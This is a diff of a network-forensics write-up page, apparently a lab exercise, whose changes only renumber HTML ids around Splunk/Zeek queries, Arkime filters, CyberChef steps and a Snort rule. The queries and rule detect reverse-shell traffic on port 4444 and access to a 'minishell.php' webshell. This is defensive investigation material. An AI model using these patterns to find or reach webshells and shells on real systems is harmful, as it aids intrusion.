-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>index=zeek sourcetype=zeek:conn | where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h) | stats count AS conns dc(id_resp_h) AS dests BY id_orig_h | sort - conns
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>index=zeek sourcetype=zeek:conn | stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service | eval first=strftime(first, "%H:%M:%S") | sort first | where NOT cidrmatch("192.168.0.0/16", id_resp_h)
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>index=zeek sourcetype=zeek:dns | stats count values(answers) AS answers min(ts) AS first BY query | eval first=strftime(first, "%H:%M:%S") | sort first
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>index=zeek sourcetype=zeek:weird | stats count BY name | sort - count
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>index=zeek sourcetype=zeek:http | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
-</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938) | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_orig_h id_orig_p id_resp_h id_resp_p conn_state orig_bytes resp_bytes duration
-</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h id_resp_p service conn_state orig_bytes resp_bytes
-</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>index=zeek sourcetype=zeek:files rx_hosts=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time tx_hosts rx_hosts mime_type filename seen_bytes md5
-</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 | stats min(ts) AS first count BY method uri | eval first=strftime(first, "%H:%M:%S") | sort first | head 5
-</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 uri="/minishell.php*"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>index=zeek | stats count AS events min(ts) AS first max(ts) AS last BY sourcetype | eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S") | sort - events
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>index=zeek sourcetype=zeek:conn | where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h) | stats count AS conns dc(id_resp_h) AS dests BY id_orig_h | sort - conns
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>index=zeek sourcetype=zeek:conn | stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service | eval first=strftime(first, "%H:%M:%S") | sort first | where NOT cidrmatch("192.168.0.0/16", id_resp_h)
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>index=zeek sourcetype=zeek:dns | stats count values(answers) AS answers min(ts) AS first BY query | eval first=strftime(first, "%H:%M:%S") | sort first
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>index=zeek sourcetype=zeek:weird | stats count BY name | sort - count
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>index=zeek sourcetype=zeek:http | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938) | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_orig_h id_orig_p id_resp_h id_resp_p conn_state orig_bytes resp_bytes duration
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h id_resp_p service conn_state orig_bytes resp_bytes
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>index=zeek sourcetype=zeek:files rx_hosts=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time tx_hosts rx_hosts mime_type filename seen_bytes md5
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 | stats min(ts) AS first count BY method uri | eval first=strftime(first, "%H:%M:%S") | sort first | head 5
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 uri="/minishell.php*"
 </span></code></pre></div>
 <p><strong>Arkime</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>ip.src == 192.168.1.100 &amp;&amp; port.dst == 4444
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>ip.src == 192.168.1.100 &amp;&amp; ip.dst == 192.168.1.101 &amp;&amp; port.dst == 4444
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>ip.dst == 192.168.1.100 &amp;&amp; http.method == POST
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>ip.dst == 192.168.1.100 &amp;&amp; http.uri == *cmdexe*
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>ip.dst == 192.168.1.100 &amp;&amp; port.dst == 55555 &amp;&amp; http.uri == *minishell.php*
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>ip.src == 192.168.1.100 &amp;&amp; port.dst == 4444
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>ip.src == 192.168.1.100 &amp;&amp; ip.dst == 192.168.1.101 &amp;&amp; port.dst == 4444
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>ip.dst == 192.168.1.100 &amp;&amp; http.method == POST
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>ip.dst == 192.168.1.100 &amp;&amp; http.uri == *cmdexe*
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>ip.dst == 192.168.1.100 &amp;&amp; port.dst == 55555 &amp;&amp; http.uri == *minishell.php*
 </span></code></pre></div>
 <p><strong>CyberChef</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>Gunzip  (→ Render HTML)
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>Extract Files (GZIP)  →  Gunzip        ← when only Destination Raw is available
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>Gunzip  (→ Render HTML)
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Extract Files (GZIP)  →  Gunzip        ← when only Destination Raw is available
 </span></code></pre></div>
 <p><strong>Snort</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>alert tcp $HOME_NET any -&gt; $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>alert tcp $HOME_NET any -&gt; $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
 </span></code></pre></div>
 <hr>
 <h2 id="lessons">Lessons<a class="headerlink" href="#lessons" title="Permanent link">¶</a></h2>
